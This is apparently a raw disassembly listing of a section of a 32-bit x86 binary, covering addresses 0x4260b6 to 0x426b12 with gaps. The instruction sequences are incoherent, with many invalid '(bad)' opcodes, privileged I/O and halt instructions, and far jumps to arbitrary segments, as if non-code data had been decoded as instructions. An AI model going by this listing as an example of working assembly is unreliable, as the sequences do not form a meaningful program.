  4260b6:	sbb    BYTE PTR [edx],dh
  4260b8:	loop   0x426101
  4260ba:	mov    eax,ds:0xb8aa0e56
  4260bf:	sub    eax,DWORD PTR [edi+0x79c328f4]
  4260c5:	mov    ch,0x33
  4260c7:	sbb    al,0x20
  4260c9:	fst    st(0)
  4260cb:	adc    ch,al
  4260cd:	arpl   WORD PTR [edx+0x4ebcdb2d],cx
  4260d3:	push   ecx
  4260d4:	mov    al,ds:0xda783167
  4260d9:	or     DWORD PTR [edx+ebx*2+0x51],0x22
  4260de:	cmp    edx,DWORD PTR [ebx+0x30]
  4260e1:	je     0x426113
  4260e3:	mov    ds:0xc18e546c,eax
  4260e8:	(bad)  
  4260ea:	pop    eax
  4260eb:	push   eax
  4260ec:	cmp    eax,0x33a2f0e5
  4260f1:	xor    BYTE PTR [eax+0x27],0x1
  4260f5:	inc    esi
  4260f6:	xor    eax,DWORD PTR [esi]
  4260f8:	es pop edx
  4260fa:	or     eax,0x76fcef08
  4260ff:	retf   
  426100:	mov    ds:0x5757b5a0,eax
  426105:	leave  
  426106:	pushf  
  426107:	mov    eax,0x1fe7666f
  42610c:	or     edi,DWORD PTR [ecx-0x3fd38e9c]
  426112:	leave  
  426113:	mov    esp,0x481940b1
  426118:	mov    edx,DWORD PTR [edi+0x282a4f3b]
  42611e:	jmp    0x42619b
  426120:	push   ebx
  426121:	pop    ebx
  426122:	jae    0x4260c6
  426124:	bound  edi,QWORD PTR [ebp+0x1e]
  426127:	cmp    DWORD PTR [edi+0x0],ecx
  42612a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42612b:	lock jge 0x4260b3
  42612e:	dec    edi
  42612f:	sahf   
  426130:	loope  0x4260b7
  426132:	test   BYTE PTR [ebx+0xfc],cl
	...
  426194:	add    BYTE PTR [eax],al
  426196:	fwait
  426197:	and    DWORD PTR [edi],ecx
  426199:	popa   
  42619a:	mov    edi,0x6ffbff6f
  42619f:	sub    BYTE PTR [ebx+0x4705283],bh
  4261a5:	mov    ecx,0x1963b
  4261aa:	pop    es
  4261ab:	add    DWORD PTR [eax],eax
  4261ad:	add    bl,ch
  4261af:	scas   eax,DWORD PTR es:[edi]
  4261b0:	(bad)  
  4261b1:	ret    
  4261b2:	adc    edx,esp
  4261b4:	push   0x2d
  4261b6:	ret    0x81e8
  4261b9:	push   0xffffffa4
  4261bb:	sbb    al,0x62
  4261bd:	mov    dl,BYTE PTR [ebp-0x46cdf0c2]
  4261c3:	out    0xbc,eax
  4261c5:	dec    eax
  4261c6:	ins    BYTE PTR es:[edi],dx
  4261c7:	push   edi
  4261c8:	(bad)  
  4261c9:	dec    ebp
  4261ca:	loope  0x426174
  4261cc:	mov    ebx,0xa855f394
  4261d1:	aas    
  4261d2:	imul   DWORD PTR [ecx-0x6d80af77]
  4261d8:	sub    BYTE PTR [esi],dl
  4261da:	sub    ecx,DWORD PTR [edx]
  4261dc:	ja     0x4261f6
  4261de:	mov    dh,dl
  4261e0:	adc    eax,0x36482e0
  4261e5:	fbstp  TBYTE PTR [edi+0x14c23b23]
  4261eb:	out    0xc5,eax
  4261ed:	mov    ebx,0x3bd7907e
  4261f2:	sbb    DWORD PTR [ebx+0x96a7620],ebp
  4261f8:	cld    
  4261f9:	jmp    0x19b5:0xa0ef57c1
  426200:	cmp    al,0xa3
  426202:	out    dx,eax
  426203:	jnp    0x426219
  426205:	inc    ebx
  426206:	bound  ecx,QWORD PTR [eax+eax*8+0xba50764]
  42620d:	jg     0x426247
  42620f:	inc    eax
  426210:	pop    ebp
  426211:	pop    es
  426212:	jns    0x42621f
  426214:	jb     0x4261db
  426216:	or     dh,BYTE PTR [ebx+0x52]
  426219:	jmp    0x4261d6
  42621b:	mov    al,0x59
  42621d:	mov    eax,ds:0xc86d5709
  426222:	lock pop ecx
  426224:	inc    ebx
  426225:	fwait
  426226:	aas    
  426227:	mov    DWORD PTR [ebp+0x4],esp
  42622a:	repnz fdivrp st(4),st
  42622d:	lods   al,BYTE PTR ds:[esi]
  42622e:	out    dx,eax
  42622f:	aaa    
  426230:	adc    DWORD PTR [ecx+eax*8-0x3a],0xe171664e
  426238:	mov    edx,0xf1135d99
  42623d:	dec    esi
  42623e:	idiv   BYTE PTR [esi-0x68cb3af6]
  426244:	mov    ecx,0xe1af1d71
  426249:	out    0x50,al
  42624b:	or     eax,0x2cd67e28
  426250:	mov    cl,0x85
  426252:	mov    DWORD PTR [ebx+edx*1],ebx
  426255:	xchg   bh,cl
  426257:	pop    ss
  426258:	into   
  426259:	cmp    al,0x91
  42625b:	add    al,0x97
  42625d:	scas   eax,DWORD PTR es:[edi]
  42625e:	mov    edx,0x7cc0a08a
  426263:	sahf   
  426264:	mov    ecx,0x1e6eb770
  426269:	or     esi,DWORD PTR [esi]
  42626b:	sbb    ah,dl
  42626d:	stos   BYTE PTR es:[edi],al
  42626e:	push   eax
  42626f:	cmp    BYTE PTR [ebp-0x19f6bd7a],al
  426275:	ret    0x458d
  426278:	clc    
  426279:	pop    edx
  42627a:	(bad)  
  42627b:	xchg   esi,eax
  42627c:	mov    ebp,0xaa40cc6f
  426281:	pop    esp
  426282:	mov    esi,0xe5ceee01
  426287:	xchg   esi,eax
  426288:	add    DWORD PTR [ebp+0x0],esi
  42628b:	repz sahf 
  42628d:	jo     0x426249
  42628f:	rcl    BYTE PTR [edi-0x5a4ae798],0x18
  426296:	pop    ds
  426297:	lods   al,BYTE PTR ds:[esi]
  426298:	inc    ecx
  426299:	mov    bl,0x72
  42629b:	out    0xf3,eax
  42629d:	mov    edx,0x27752d66
  4262a2:	mov    dl,0xf1
  4262a4:	aam    0x46
  4262a6:	iret   
  4262a7:	cmc    
  4262a8:	xchg   DWORD PTR [edx+eiz*1+0x5f],ebp
  4262ac:	jns    0x42622e
  4262ae:	and    bh,bl
  4262b0:	fwait
  4262b1:	mov    bh,0xf2
  4262b3:	ret    0xf9
	...
  426316:	push   esp
  426317:	and    eax,0xeefd4e8d
  42631c:	xlat   BYTE PTR ds:[ebx]
  42631d:	aas    
  42631e:	ins    BYTE PTR es:[edi],dx
  42631f:	lods   al,BYTE PTR ds:[esi]
  426320:	ret    0xb654
  426323:	mov    ah,0xa1
  426325:	or     BYTE PTR [edx-0x69],al
  426328:	add    DWORD PTR [eax],eax
  42632a:	pop    es
  42632b:	add    DWORD PTR [eax],eax
  42632d:	add    BYTE PTR [edx+ebx*4+0x17],dl
  426331:	sahf   
  426332:	scas   eax,DWORD PTR es:[edi]
  426333:	sub    BYTE PTR [eax+edi*4-0x1c65c3c4],dl
  42633a:	sub    DWORD PTR [esi],ecx
  42633c:	push   esp
  42633d:	out    0x28,al
  42633f:	or     BYTE PTR [ebx+ecx*2-0x779e2fc6],dh
  426346:	xor    al,BYTE PTR [edx]
  426348:	dec    ecx
  426349:	call   0xf2b4:0x18b87c8a
  426350:	or     BYTE PTR [esi+0x5e],cl
  426353:	adc    al,0x43
  426355:	xchg   al,bh
  426357:	loop   0x4262e0
  426359:	ficomp DWORD PTR [ecx+0xb42ffeb]
  42635f:	out    0x35,al
  426361:	sub    dl,ah
  426363:	rcl    DWORD PTR [eax+0x7f],cl
  426366:	push   esp
  426367:	scas   eax,DWORD PTR es:[edi]
  426368:	lock push es
  42636a:	cdq    
  42636b:	imul   eax,DWORD PTR [edi+0x6],0x55af1ad8
  426372:	mov    esi,0xc1f7ea81
  426377:	mov    edi,0xc6c4fe05
  42637c:	dec    BYTE PTR [edx+edi*4]
  42637f:	mov    bh,cl
  426381:	cs ret 
  426383:	rol    ecx,cl
  426385:	montmul (bad)
  426386:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426387:	xchg   BYTE PTR [ebp+0x50],dl
  42638a:	dec    eax
  42638b:	ficomp WORD PTR [eax+0x6bf9374f]
  426391:	rcl    DWORD PTR [ebx+0x21],cl
  426394:	xchg   ebx,eax
  426395:	sahf   
  426396:	hlt    
  426397:	jbe    0x4263ca
  426399:	mov    dh,0x25
  42639b:	stc    
  42639c:	es pop es
  42639e:	adc    BYTE PTR [edi-0x68e4d525],0x9d
  4263a5:	pop    es
  4263a6:	mov    esi,eax
  4263a8:	int    0xf3
  4263aa:	sar    BYTE PTR [ebx+0x650dc981],1
  4263b0:	in     al,0xd5
  4263b2:	retf   
  4263b3:	call   0xae01d27
  4263b8:	inc    esp
  4263b9:	xchg   ebx,eax
  4263ba:	(bad)  
  4263bb:	lock loopne 0x4263e1
  4263be:	push   ebp
  4263bf:	fnstsw WORD PTR [eax]
  4263c1:	lahf   
  4263c2:	call   0x9aac:0x5c8e2492
  4263c9:	stos   BYTE PTR es:[edi],al
  4263ca:	xor    esp,DWORD PTR [ebx]
  4263cc:	push   eax
  4263cd:	gs mov esi,0xee28532e
  4263d3:	add    eax,0x205daae3
  4263d8:	cli    
  4263d9:	das    
  4263da:	cmp    edi,DWORD PTR [edx+esi*8-0x5ba10c68]
  4263e1:	(bad)  
  4263e2:	out    0x6c,eax
  4263e4:	pop    eax
  4263e5:	int    0xd1
  4263e7:	mov    WORD PTR [ebx+ecx*8-0x6b05bda3],?
  4263ee:	jge    0x426431
  4263f0:	push   0xffffff80
  4263f2:	retf   0x7922
  4263f5:	out    dx,eax
  4263f6:	xchg   BYTE PTR [ebp+esi*2-0x3080be4e],ch
  4263fd:	adc    eax,0xa020f891
  426402:	sub    BYTE PTR ds:0x5a306118,bl
  426408:	xchg   edx,eax
  426409:	xchg   ebx,eax
  42640a:	push   eax
  42640b:	ret    0xd2f7
  42640e:	mov    bl,0x8e
  426410:	fdiv   DWORD PTR [ebp+0x54]
  426413:	pop    ecx
  426414:	dec    ecx
  426415:	fmulp  st(7),st
  426417:	sbb    DWORD PTR [ebp+0x19],esp
  42641a:	pop    ecx
  42641b:	in     al,0xdd
  42641d:	in     eax,dx
  42641e:	dec    esi
  42641f:	(bad)
  426423:	add    al,ah
  426425:	dec    ebx
  426426:	dec    ecx
  426427:	into   
  426428:	out    0x11,eax
  42642a:	pop    ds
  42642b:	dec    edx
  42642c:	jno    0x4263bc
  42642e:	ret    
  42642f:	mov    al,ds:0x242e15a4
  426434:	sub    BYTE PTR [eax],al
	...
  426496:	imul   ebp,DWORD PTR [edi-0x78],0xe9ef8e08
  42649d:	outs   dx,DWORD PTR ds:[esi]
  42649e:	(bad)  
  42649f:	fistp  QWORD PTR [edx+0x4c]
  4264a2:	fcom   QWORD PTR [edi-0x67b6bcf5]
  4264a8:	add    DWORD PTR [eax],eax
  4264aa:	pop    es
  4264ab:	add    DWORD PTR [eax],eax
  4264ad:	add    BYTE PTR [edi+eax*1],dh
  4264b0:	aaa    
  4264b1:	das    
  4264b2:	cld    
  4264b3:	out    0xef,eax
  4264b5:	add    eax,0x3ada1d28
  4264ba:	jb     0x426444
  4264bc:	enter  0x1240,0x5a
  4264c0:	pop    esi
  4264c1:	jmp    0x4264c6
  4264c3:	addr16 pop eax
  4264c5:	add    dl,BYTE PTR [ebx]
  4264c7:	ror    BYTE PTR [eax],1
  4264c9:	rcr    BYTE PTR [ebx+0x21],cl
  4264cc:	test   eax,0x920b97a9
  4264d1:	in     al,0x12
  4264d3:	dec    cl
  4264d5:	jne    0x4264bc
  4264d7:	xor    eax,0x3f3d1ea5
  4264dc:	push   es
  4264dd:	sub    BYTE PTR [edi-0x47],al
  4264e0:	(bad)  
  4264e1:	jmp    0x3360:0x75b17032
  4264e8:	test   al,0x2b
  4264ea:	sbb    bh,BYTE PTR [ebp+0x64]
  4264ed:	bound  edx,QWORD PTR [ecx]
  4264ef:	leave  
  4264f0:	iret   
  4264f1:	pop    es
  4264f2:	mov    bh,0x66
  4264f4:	ja     0x42650c
  4264f6:	mov    ah,0x33
  4264f8:	ja     0x42656e
  4264fa:	cdq    
  4264fb:	dec    esi
  4264fc:	nop    ecx
  4264ff:	sbb    eax,0x8ce8276d
  426504:	call   0x1496:0x5887c7b0
  42650b:	mov    cl,BYTE PTR [eax]
  42650d:	inc    edi
  42650e:	push   cs
  42650f:	(bad)  
  426510:	xlat   BYTE PTR ds:[ebx]
  426511:	(bad)  
  426512:	fnstsw WORD PTR [ebp-0x61]
  426515:	retf   
  426516:	cmp    eax,0xcbb16c87
  42651b:	mov    DWORD PTR [edi-0x2a],ecx
  42651e:	pop    ebx
  42651f:	sbb    DWORD PTR [edx],esi
  426521:	add    bl,BYTE PTR [ecx+eax*1-0x53de7ec0]
  426528:	mov    edx,0x3c42fcac
  42652d:	scas   al,BYTE PTR es:[edi]
  42652e:	js     0x4264e5
  426530:	xchg   esi,eax
  426531:	xchg   cx,ax
  426533:	push   edi
  426534:	mov    ch,0xd4
  426536:	mov    ecx,0x2e34a4cc
  42653b:	scas   eax,DWORD PTR es:[edi]
  42653c:	jbe    0x4264f0
  42653e:	mov    dl,0xf7
  426540:	push   ecx
  426541:	ret    
  426542:	jecxz  0x426501
  426544:	xchg   ecx,eax
  426545:	ins    DWORD PTR es:[edi],dx
  426546:	cli    
  426547:	loop   0x426502
  426549:	and    al,0xe1
  42654b:	or     DWORD PTR [esi+0x2],0x61
  42654f:	pusha  
  426550:	jp     0x42659d
  426552:	and    DWORD PTR cs:[eax+0x7e313750],eax
  426559:	cdq    
  42655a:	(bad)  
  42655c:	loop   0x4264fe
  42655e:	jecxz  0x42657b
  426560:	xor    BYTE PTR [edi],0x5a
  426563:	fcomi  st,st(7)
  426565:	sbb    esi,DWORD PTR [eax-0x52]
  426568:	aas    
  426569:	repnz xor al,0x59
  42656c:	pushf  
  42656d:	and    cl,dl
  42656f:	ins    BYTE PTR es:[edi],dx
  426570:	mov    ah,BYTE PTR [ebx]
  426572:	(bad)  
  426573:	mov    edi,0xf33f103
  426578:	ins    DWORD PTR es:[edi],dx
  426579:	pop    ebp
  42657a:	cmp    BYTE PTR [eax],ch
  42657c:	nop
  42657d:	and    al,BYTE PTR [esi]
  42657f:	pop    esp
  426580:	es xchg ebp,eax
  426582:	ss xchg edx,eax
  426584:	mov    ds:0x7da9808a,eax
  426589:	pop    ss
  42658a:	ret    
  42658b:	push   ecx
  42658c:	fdiv   QWORD PTR [ebx]
  42658e:	mov    es,WORD PTR [esp+ecx*2+0x45]
  426592:	push   cs
  426593:	pop    es
  426594:	outs   dx,BYTE PTR ds:[esi]
  426595:	daa    
  426596:	pop    edx
  426597:	imul   ebp,DWORD PTR [edx+0x3267a6d5],0xe8ea8113
  4265a1:	loopne 0x426552
  4265a3:	rcl    DWORD PTR [ebx],cl
  4265a5:	sub    BYTE PTR [ebx-0xb],ah
  4265a8:	jmp    0x4265a6
  4265aa:	fild   DWORD PTR [edx+eax*2+0x2d262c78]
  4265b1:	mov    dl,0xb7
  4265b3:	mov    BYTE PTR [ebp+0x0],bh
	...
  426615:	add    BYTE PTR [edx],dl
  426617:	retf   
  426618:	sbb    DWORD PTR [edx],0xcb9b5ad9
  42661e:	xor    DWORD PTR [ecx+0x6f],0x2f
  426622:	cld    
  426623:	mov    esp,0x99500a33
  426628:	add    DWORD PTR [eax],eax
  42662a:	pop    es
  42662b:	add    DWORD PTR [eax],eax
  42662d:	add    BYTE PTR [esi],dh
  42662f:	inc    edx
  426630:	ss into 
  426632:	sub    al,0x1b
  426634:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426635:	aad    0xec
  426637:	push   0xffffff98
  426639:	call   0xede384fe
  42663e:	js     0x426689
  426640:	inc    ecx
  426641:	(bad)
  426644:	inc    ecx
  426645:	lods   eax,DWORD PTR ds:[esi]
  426646:	arpl   sp,bx
  426648:	xor    bh,BYTE PTR es:[edx]
  42664b:	or     al,0xa8
  42664d:	mov    bl,0xd4
  42664f:	adc    eax,0xae7bb1c5
  426654:	xchg   edi,eax
  426655:	aaa    
  426656:	les    edx,FWORD PTR [eax]
  426658:	mov    ch,BYTE PTR [ecx+0x2a51399]
  42665e:	adc    eax,0x6dde4cf4
  426663:	jae    0x426655
  426665:	inc    esp
  426666:	mov    al,0xc8
  426668:	sbb    BYTE PTR [edx-0x3a],al
  42666b:	adc    edi,DWORD PTR [edx]
  42666d:	mov    bl,0x9
  42666f:	sbb    al,0xac
  426671:	jg     0x426647
  426673:	aas    
  426674:	jbe    0x426600
  426676:	sub    eax,0xf60c6665
  42667b:	in     eax,dx
  42667c:	or     BYTE PTR [esi-0x25c27ba],ah
  426682:	jnp    0x95df00fe
  426688:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426689:	aam    0xc5
  42668b:	(bad)  
  42668c:	sti    
  42668d:	and    DWORD PTR [edx],esp
  42668f:	xchg   ecx,eax
  426690:	pop    edi
  426691:	lahf   
  426692:	mov    ebp,0xc5537ed6
  426697:	sbb    al,BYTE PTR [ebp+0x49]
  42669a:	mov    BYTE PTR [ecx-0x2ee97951],ch
  4266a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4266a1:	into   
  4266a2:	adc    eax,0x731f8881
  4266a7:	pop    ebx
  4266a8:	mov    ss,WORD PTR [ecx+eax*4+0x3e]
  4266ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4266ad:	fs pop esi
  4266af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4266b0:	ins    BYTE PTR es:[edi],dx
  4266b1:	cmp    eax,DWORD PTR [ecx+0x3e]
  4266b4:	stos   BYTE PTR es:[edi],al
  4266b5:	and    eax,0xe94955c9
  4266ba:	pop    es
  4266bb:	je     0x4266d0
  4266bd:	clc    
  4266be:	retf   0xb71b
  4266c1:	mov    DWORD PTR [esi*2+0x336c0880],edi
  4266c8:	mov    ecx,0xeaa872a4
  4266cd:	cmp    BYTE PTR [eax],cl
  4266cf:	add    dl,BYTE PTR [esi-0x53471dbd]
  4266d5:	sbb    al,0xd
  4266d7:	sub    ebp,0xffffffef
  4266da:	cdq    
  4266db:	rol    DWORD PTR [ebp-0xfb36b4f],1
  4266e1:	cmp    DWORD PTR [esi],eax
  4266e3:	mov    al,0x28
  4266e5:	jmp    0x4265:0x1504a100
  4266ec:	xchg   esp,eax
  4266ed:	push   0xb9dc66e9
  4266f2:	cld    
  4266f3:	xor    eax,DWORD PTR ds:[eax+0x987230d]
  4266fa:	aad    0xa
  4266fc:	dec    edx
  4266fd:	aas    
  4266fe:	hlt    
  4266ff:	icebp  
  426700:	nop
  426701:	in     al,dx
  426702:	gs push ecx
  426704:	shl    DWORD PTR [ecx+esi*1+0x44],0x82
  426709:	mov    ecx,esp
  42670b:	fnstenv [di]
  42670e:	sub    al,0xa8
  426710:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426711:	shr    DWORD PTR ds:0xc94170db,1
  426717:	jns    0x31a67f65
  42671d:	pop    ds
  42671e:	lock pop ebx
  426720:	lock sbb al,0x63
  426723:	iret   
  426724:	in     al,dx
  426725:	shl    DWORD PTR [edx+0x1dc950ce],0x5d
  42672c:	mov    esp,DWORD PTR [ecx+edx*1+0x36]
  426730:	add    ebp,ebp
  426732:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426733:	mov    ebx,0x30
	...
  426794:	add    BYTE PTR [eax],al
  426796:	mov    eax,0xff2ace8d
  42679b:	imul   edi,esp,0xffffff9f
  42679e:	sbb    esp,eax
  4267a0:	leave  
  4267a1:	dec    ebx
  4267a2:	hlt    
  4267a3:	cdq    
  4267a4:	fist   WORD PTR cs:[edi-0x66]
  4267a8:	add    DWORD PTR [eax],eax
  4267aa:	pop    es
  4267ab:	add    DWORD PTR [eax],eax
  4267ad:	add    al,ah
  4267af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4267b1:	jmp    0x9f29:0x6c3cabcf
  4267b8:	sbb    ebp,eax
  4267ba:	(bad)  [edi]
  4267bc:	lea    esi,[esi-0x445d5dec]
  4267c2:	cmp    BYTE PTR [ecx],dh
  4267c4:	(bad)  
  4267c5:	aam    0xfc
  4267c7:	scas   eax,DWORD PTR es:[edi]
  4267c8:	jno    0x4267e4
  4267ca:	mov    dh,0x5b
  4267cc:	xchg   esi,eax
  4267cd:	fld    TBYTE PTR [ebx]
  4267cf:	(bad)  
  4267d0:	(bad)  
  4267d1:	fs rcl di,1
  4267d5:	imul   ebp,esi,0xed701b8c
  4267db:	pop    edi
  4267dc:	adc    BYTE PTR [ebp+0x2659610d],bh
  4267e2:	ror    BYTE PTR [edx+0x15],0xb2
  4267e6:	outs   dx,DWORD PTR ds:[esi]
  4267e7:	mov    dl,0xbd
  4267e9:	pusha  
  4267ea:	sub    eax,0x81065e28
  4267ef:	xlat   BYTE PTR ds:[ebx]
  4267f0:	retf   0x83b4
  4267f3:	push   0xba3d2912
  4267f8:	ins    BYTE PTR es:[edi],dx
  4267f9:	test   eax,0x84668f79
  4267fe:	aas    
  4267ff:	repnz mov al,BYTE PTR [esi-0x12e04dc9]
  426806:	ret    
  426807:	push   ss
  426808:	cmp    esi,DWORD PTR [ecx+0x4e]
  42680b:	(bad)  
  42680d:	add    BYTE PTR [ebp+0x4b7090a9],0x5d
  426814:	inc    eax
  426815:	adc    DWORD PTR [esi+0x72eeb3e],esi
  42681b:	test   al,0x7b
  42681d:	and    eax,0x18ce4d96
  426822:	je     0x426862
  426824:	pop    es
  426825:	stos   DWORD PTR es:[edi],eax
  426826:	fmul   QWORD PTR [ebp-0x2c8327be]
  42682c:	xlat   BYTE PTR ds:[ebx]
  42682d:	cmp    esi,DWORD PTR ss:[edx+0x69ef8849]
  426834:	loopne 0x4267e5
  426836:	aas    
  426837:	nop
  426838:	pop    ebp
  426839:	adc    cl,BYTE PTR [esp+ebp*2-0x5d]
  42683d:	adc    al,0x21
  42683f:	cdq    
  426840:	fstp   QWORD PTR [esi-0x1]
  426843:	adc    al,0x12
  426845:	mov    esp,0x867970dd
  42684a:	std    
  42684b:	shl    DWORD PTR [ebx+0x7c],0xa9
  42684f:	dec    edx
  426850:	mov    ah,0x2e
  426852:	mov    ch,0x6e
  426854:	push   ecx
  426855:	stos   BYTE PTR es:[edi],al
  426856:	sub    al,0xbf
  426858:	push   es
  426859:	and    DWORD PTR [esi],esi
  42685b:	mov    bl,0x86
  42685d:	test   DWORD PTR [ebp-0x17f95eed],esp
  426863:	pusha  
  426864:	sbb    ah,BYTE PTR [esi]
  426866:	sbb    al,0xe0
  426868:	and    al,0x61
  42686a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42686b:	ins    DWORD PTR es:[edi],dx
  42686c:	enter  0xddc8,0x31
  426870:	xchg   ebp,eax
  426871:	addr16 icebp 
  426873:	(bad)  
  426874:	(bad)
  426878:	sub    al,0xd2
  42687a:	(bad)  
  42687c:	rcl    BYTE PTR [edx-0x1622ee05],1
  426882:	push   eax
  426883:	ret    
  426884:	arpl   sp,dx
  426886:	jge    0x4268e4
  426888:	daa    
  426889:	in     al,dx
  42688a:	test   DWORD PTR [esi-0x7f39dfbc],esi
  426890:	or     ebx,edx
  426892:	adc    eax,0x71ca8457
  426897:	or     BYTE PTR [eax-0x6c427897],cl
  42689d:	test   eax,0x6a714903
  4268a2:	push   ebx
  4268a3:	ins    DWORD PTR es:[edi],dx
  4268a4:	sti    
  4268a5:	jns    0x42686f
  4268a7:	div    esp
  4268a9:	jb     0x426888
  4268ab:	jl     0x426844
  4268ad:	fidivr DWORD PTR [ecx+0x0]
  4268b0:	fild   WORD PTR [edi+edi*2]
  4268b3:	shr    BYTE PTR [ecx],1
	...
  426915:	add    BYTE PTR [esi+ecx*2+0x7fff7d7d],cl
  42691c:	mov    edi,?
  42691e:	cs out 0xa0,eax
  426921:	stos   DWORD PTR es:[edi],eax
  426922:	xchg   esi,eax
  426923:	xor    DWORD PTR [esi+0x19b5ef2],edi
  426929:	add    BYTE PTR [edi],al
  42692b:	add    DWORD PTR [eax],eax
  42692d:	add    BYTE PTR [esi],ah
  42692f:	push   ss
  426930:	pushf  
  426931:	adc    BYTE PTR [edx-0x58a0d779],dl
  426937:	jmp    0x3430d682
  42693c:	jg     0x4269ba
  42693e:	ja     0x42699a
  426940:	stos   BYTE PTR es:[edi],al
  426941:	dec    ebx
  426942:	dec    ebx
  426943:	sub    esi,esp
  426945:	iret   
  426946:	jo     0x4269c5
  426948:	mov    esi,0xf5cbcd6c
  42694d:	sbb    bh,BYTE PTR [esp+edi*4]
  426950:	push   edx
  426951:	out    dx,eax
  426952:	scas   al,BYTE PTR es:[edi]
  426953:	push   edx
  426954:	jno    0x426998
  426956:	scas   al,BYTE PTR es:[edi]
  426957:	mov    esp,0x5efe8726
  42695c:	aaa    
  42695d:	inc    edx
  42695e:	push   es
  42695f:	lds    eax,FWORD PTR [esp+esi*1-0x7fb60f5a]
  426966:	sbb    BYTE PTR [esi],bh
  426968:	out    dx,al
  426969:	arpl   WORD PTR [eax],ax
  42696b:	in     al,dx
  42696c:	loopne 0x42690c
  42696e:	aas    
  42696f:	mov    dh,0xd6
  426971:	pop    edi
  426972:	loop   0x4269a0
  426974:	(bad)  
  426975:	imul   esp,ebx,0x26
  426978:	push   cs
  426979:	(bad)  
  42697a:	retf   
  42697b:	or     eax,0x9e566ee5
  426980:	sbb    ebx,DWORD PTR [esi]
  426982:	and    al,ah
  426984:	xchg   esp,eax
  426985:	fisttp WORD PTR [ebp-0x4bef6041]
  42698b:	and    BYTE PTR fs:[ecx-0x66],al
  42698f:	test   DWORD PTR [ebp+0x390f020],eax
  426995:	or     BYTE PTR [eax-0x705920ad],ah
  42699b:	add    BYTE PTR [ecx],0xc4
  42699e:	xor    esp,esp
  4269a0:	push   ds
  4269a1:	add    dl,BYTE PTR ds:0xe2f6bce1
  4269a7:	daa    
  4269a8:	mov    ebx,0xa9e82bec
  4269ad:	sub    BYTE PTR [eax-0x80],cl
  4269b0:	or     eax,0x8dd5c538
  4269b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4269b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4269b7:	inc    edi
  4269b8:	or     al,0x30
  4269ba:	aaa    
  4269bb:	adc    DWORD PTR [ebp-0x2183c18a],edx
  4269c1:	hlt    
  4269c2:	outs   dx,DWORD PTR ds:[esi]
  4269c3:	push   esp
  4269c4:	retf   
  4269c5:	outs   dx,DWORD PTR ds:[esi]
  4269c6:	xchg   BYTE PTR [ebx],bl
  4269c8:	pop    ds
  4269c9:	rcr    DWORD PTR [ebp+0x7c],cl
  4269cc:	shr    DWORD PTR ds:0x69ae013e,1
  4269d2:	shl    bh,0x4c
  4269d5:	pop    ebx
  4269d6:	sbb    BYTE PTR [ebp-0x48cd87dc],0x34
  4269dd:	inc    eax
  4269de:	pop    esi
  4269df:	icebp  
  4269e0:	icebp  
  4269e1:	jge    0x42696f
  4269e3:	(bad)  
  4269e4:	push   cs
  4269e5:	sub    cl,BYTE PTR ds:0xdd3c1b2d
  4269eb:	or     ecx,edi
  4269ed:	iret   
  4269ee:	sbb    edx,DWORD PTR [edi+0xb646027]
  4269f4:	push   cs
  4269f5:	std    
  4269f6:	mov    bl,0xad
  4269f8:	test   eax,0xe3fa652b
  4269fd:	xchg   esi,eax
  4269fe:	cwde   
  4269ff:	mov    ch,cl
  426a01:	xchg   ebp,eax
  426a02:	(bad)  
  426a03:	jne    0x426a6b
  426a05:	jbe    0x426997
  426a07:	pusha  
  426a08:	enter  0xad62,0x1a
  426a0c:	xchg   ecx,eax
  426a0d:	outs   dx,BYTE PTR ds:[esi]
  426a0e:	ficom  DWORD PTR [eax]
  426a10:	mov    ebp,0xe9fca247
  426a15:	test   eax,0xd059d142
  426a1a:	add    ecx,DWORD PTR [esi+0x4a]
  426a1d:	popf   
  426a1e:	or     al,0xe9
  426a20:	pop    ds
  426a21:	dec    ecx
  426a22:	arpl   WORD PTR [ebx+0x1d973cbe],bx
  426a28:	ss push eax
  426a2a:	cs pop ebp
  426a2c:	arpl   WORD PTR [eax+0x5f],cx
  426a2f:	test   DWORD PTR [ebx-0x6958fc1f],esp
	...
  426a95:	add    BYTE PTR [ecx-0x42a9f2d8],bl
  426a9b:	ja     0x426a78
  426a9d:	out    dx,eax
  426a9e:	xor    dl,BYTE PTR [edi+eiz*4]
  426aa1:	cld    
  426aa2:	pop    ebx
  426aa3:	jmp    0x1:0x9c653438
  426aaa:	pop    es
  426aab:	add    DWORD PTR [eax],eax
  426aad:	add    BYTE PTR [edx],dl
  426aaf:	popf   
  426ab0:	out    dx,eax
  426ab1:	mov    ebx,es
  426ab3:	cld    
  426ab4:	mov    eax,ds:0x63559107
  426ab9:	push   cs
  426aba:	xchg   ebp,eax
  426abb:	or     eax,0xce8c4e64
  426ac0:	push   0x24db2821
  426ac5:	inc    esp
  426ac6:	(bad)  
  426ac7:	cld    
  426ac8:	pop    ecx
  426ac9:	rcl    BYTE PTR [ebx],0x27
  426acc:	mov    edx,DWORD PTR [ebp-0x15f0a5d0]
  426ad2:	sub    al,0x9
  426ad4:	and    dl,BYTE PTR [edx+0x42aadd08]
  426ada:	fcom   QWORD PTR [esi]
  426adc:	adc    eax,DWORD PTR [edx+0x66]
  426adf:	mov    esp,0x87f3a0e3
  426ae4:	mov    al,0xbd
  426ae6:	xchg   esp,eax
  426ae7:	jge    0x426a97
  426ae9:	jge    0x426b15
  426aeb:	adc    al,0xac
  426aed:	pop    esp
  426aee:	mov    al,BYTE PTR ds:0xbcb30f05
  426af4:	popa   
  426af5:	mov    ch,0x39
  426af7:	cmc    
  426af8:	or     BYTE PTR [edi],al
  426afa:	xor    eax,0xa577119a
  426aff:	pop    ss
  426b00:	mov    esp,DWORD PTR [ecx]
  426b02:	or     edi,DWORD PTR [esi+0x6ba9ea4c]
  426b08:	push   ecx
  426b09:	mov    ah,0xe
  426b0b:	add    ebp,DWORD PTR [edx+ebp*1-0x49dfb4c8]
  426b12:	mov    bh,0x2c
